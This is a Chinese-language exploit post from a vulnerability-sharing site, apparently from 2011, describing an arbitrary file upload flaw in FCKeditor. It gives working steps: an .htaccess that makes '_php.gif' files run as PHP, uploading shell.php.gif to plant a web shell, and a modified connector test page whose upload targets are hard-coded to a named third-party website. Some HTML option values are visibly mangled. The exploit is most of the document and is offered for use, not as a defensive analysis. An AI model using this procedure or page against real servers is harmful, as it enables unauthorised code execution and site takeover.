@@ -1,0 +1,362 @@
+FCKeditor编辑器全部版本另类上传漏洞
+文档分类: Problem & Skills 
+发表时间：2011-8-26 1:32:37
+漏洞添加：sitedir|关注度[619]
+站内搜索：FCKeditor编辑器全部版本另类上传漏洞
+漏洞邻居：PHPEIP CMS 本地包含漏洞 | syWebEditor上传漏洞及修复  非安全漏洞编码
+[F][S-1576] 
+ 
+
+[FCKeditor编辑器全部版本另类上传漏洞 全文]
+
+FCKeditor all versian Arbitrary File Upload Vulnerability
+发布时间: 2011
+源码地址:http://sourceforge.net/projects/fckeditor/
+漏洞作者: pentesters.ir
+利用步骤:
+1.创建一个htaccess文件:
+代码内容:
+<FilesMatch “_php.gif”>
+SetHandler application/x-httpd-php
+</FilesMatch>
+
+2.实用编辑器上传htaccess文件.
+
+http://www.sitedirsec.com/FCKeditor/editor/filemanager/upload/test.html
+
+http://www.sitedirsec.com/FCKeditor/editor/filemanager/browser/default/connectors/test.html
+
+3.上传shell.php.gif
+4.上传后shell.php.gif, 会自动被改名为 shell_php.gif
+5.访问http://www.sitedirsec.com/上传目录/shell_php.gif
+
+
+
+把以下代码保存成TEST.HTML就行了。然后修改里面的上传文件
+
+
+<!--   
+
+002 * FCKeditor - The text editor for Internet - [url]http://www.fckeditor.net[/url]   
+
+003 * Copyright (C) 2003-2007 Frederico Caldeira Knabben   
+
+004 *   
+
+005 * == BEGIN LICENSE ==   
+
+006 *   
+
+007 * Licensed under the terms of any of the following licenses at your   
+
+008 * choice:   
+
+009 *   
+
+010 *  - GNU General Public License Version 2 or later (the "GPL")   
+
+011 *    [url]http://www.gnu.org/licenses/gpl.html[/url]   
+
+012 *   
+
+013 *  - GNU Lesser General Public License Version 2.1 or later (the "LGPL")   
+
+014 *    [url]http://www.gnu.org/licenses/lgpl.html[/url]   
+
+015 *   
+
+016 *  - Mozilla Public License Version 1.1 or later (the "MPL")   
+
+017 *    [url]http://www.mozilla.org/MPL/MPL-1.1.html[/url]   
+
+018 *   
+
+019 * == END LICENSE ==   
+
+020 *   
+
+021 * Test page for the File Browser connectors.   
+
+022 -->  
+
+023 <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN">   
+
+024 <html xmlns="http://www.w3.org/1999/xhtml">   
+
+025 <head>   
+
+026     <title>FCKeditor - Connectors Tests</title>   
+
+027     <script type="text/javascript">   
+
+028 function BuildBaseUrl( command )   
+
+029 {   
+
+030     var sUrl =   
+
+031         document.getElementById('cmbConnector').value +   
+
+032         '?Command=' + command +   
+
+033         '&Type=' + document.getElementById('cmbType').value +   
+
+034         '&CurrentFolder=' + encodeURIComponent(document.getElementById('txtFolder').value) ;   
+
+035     return sUrl ;   
+
+036 }   
+
+037 function SetFrameUrl( url )   
+
+038 {   
+
+039     document.getElementById('eRunningFrame').src = url ;   
+
+040     document.getElementById('eUrl').innerHTML = url ;   
+
+041 }   
+
+042 function GetFolders()   
+
+043 {   
+
+044     SetFrameUrl( BuildBaseUrl( 'GetFolders' ) ) ;   
+
+045     return false ;   
+
+046 }   
+
+047 function GetFoldersAndFiles()   
+
+048 {   
+
+049     SetFrameUrl( BuildBaseUrl( 'GetFoldersAndFiles' ) ) ;   
+
+050     return false ;   
+
+051 }   
+
+052 function CreateFolder()   
+
+053 {   
+
+054     var sFolder = prompt( 'Type the folder name:', 'Test Folder' ) ;   
+
+055     if ( ! sFolder )   
+
+056         return false ;   
+
+057     var sUrl = BuildBaseUrl( 'CreateFolder' ) ;   
+
+058     sUrl += '&NewFolderName=' + encodeURIComponent( sFolder ) ;   
+
+059     SetFrameUrl( sUrl ) ;   
+
+060     return false ;   
+
+061 }   
+
+062 function OnUploadCompleted( errorNumber, fileName )   
+
+063 {   
+
+064     switch ( errorNumber )   
+
+065     {   
+
+066         case 0 :   
+
+067             alert( 'File uploaded with no errors' ) ;   
+
+068             break ;   
+
+069         case 201 :   
+
+070             GetFoldersAndFiles() ;   
+
+071             alert( 'A file with the same name is already available. The uploaded file has been renamed to "' + fileName + '"' ) ;   
+
+072             break ;   
+
+073         case 202 :   
+
+074             alert( 'Invalid file' ) ;   
+
+075             break ;   
+
+076         default :   
+
+077             alert( 'Error on file upload. Error number: ' + errorNumber ) ;   
+
+078             break ;   
+
+079     }   
+
+080 }   
+
+081 this.frames.frmUpload = this ;   
+
+082 function SetAction()   
+
+083 {   
+
+084     var sUrl = BuildBaseUrl( 'FileUpload' ) ;   
+
+085     document.getElementById('eUrl').innerHTML = sUrl ;   
+
+086     document.getElementById('frmUpload').action = sUrl ;   
+
+087 }   
+
+088     </script>   
+
+089 </head>   
+
+090 <body>   
+
+091     <table height="100%" cellspacing="0" cellpadding="0" width="100%" border="0">   
+
+092         <tr>   
+
+093             <td>   
+
+094                 <table cellspacing="0" cellpadding="0" border="0">   
+
+095                     <tr>   
+
+096                         <td>   
+
+097                             Connector:   
+
+098                             <select id="cmbConnector" name="cmbConnector">   
+
+099                                 <option value="http://zjmyjs.com/editor/filemanager/connectors/asp/connector.asp" selected="selected">ASP</option>   
+
+100                                 <option value="ASP.Net</option'>http://zjmyjs.com/editor/filemanager/connectors/aspx/connector.aspx">ASP.Net</option>   
+
+101                                 <option value="cfm/connector.cfm">ColdFusion</option>   
+
+102                                 <option value="lasso/connector.lasso">Lasso</option>   
+
+103                                 <option value="perl/connector.cgi">Perl</option>   
+
+104                                 <option value="PHP</option'>http://zjmyjs.com/editor/filemanager/connectors/php/connector.php">PHP</option>   
+
+105                                 <option value="py/connector.py">Python</option>   
+
+106                             </select>   
+
+107                         </td>   
+
+108                         <td>   
+
+109                                </td>   
+
+110                         <td>   
+
+111                             Current Folder   
+
+112                             <input id="txtFolder" type="text" value="/" name="txtFolder" /></td>   
+
+113                         <td>   
+
+114                                </td>   
+
+115                         <td>   
+
+116                             Resource Type   
+
+117                             <select id="cmbType" name="cmbType">   
+
+118                                 <option value="File" selected="selected">File</option>   
+
+119                                 <option value="Image">Image</option>   
+
+120                                 <option value="Flash">Flash</option>   
+
+121                                 <option value="Media">Media</option>   
+
+122                                 <option value="Invalid">Invalid Type (for testing)</option>   
+
+123                             </select>   
+
+124                         </td>   
+
+125                     </tr>   
+
+126                 </table>   
+
+127                     
+
+128                 <table cellspacing="0" cellpadding="0" border="0">   
+
+129                     <tr>   
+
+130                         <td valign="top">   
+
+131                             <a href="#" onclick="GetFolders();">Get Folders</a></td>   
+
+132                         <td>   
+
+133                                </td>   
+
+134                         <td valign="top">   
+
+135                             <a href="#" onclick="GetFoldersAndFiles();">Get Folders and Files</a></td>   
+
+136                         <td>   
+
+137                                </td>   
+
+138                         <td valign="top">   
+
+139                             <a href="#" onclick="CreateFolder();">Create Folder</a></td>   
+
+140                         <td>   
+
+141                                </td>   
+
+142                         <td valign="top">   
+
+143                             <form id="frmUpload" action="" target="eRunningFrame" method="post" enctype="multipart/form-data">   
+
+144                                 File Upload   
+
+145                                 <input id="txtFileUpload" type="file" name="NewFile" />   
+
+146                                 <input type="submit" value="Upload" onclick="SetAction();" />   
+
+147                             </form>   
+
+148                         </td>   
+
+149                     </tr>   
+
+150                 </table>   
+
+151                     
+
+152                 URL: <span id="eUrl"></span>   
+
+153             </td>   
+
+154         </tr>   
+
+155         <tr>   
+
+156             <td height="100%" valign="top">   
+
+157                 <iframe id="eRunningFrame" src="javascript:void(0)" name="eRunningFrame" width="100%"  
+
+158                     height="100%"></iframe>   
+
+159             </td>   
+
+160         </tr>   
+
+161     </table>   
+
+162 </body>   
+
+163 </html> 
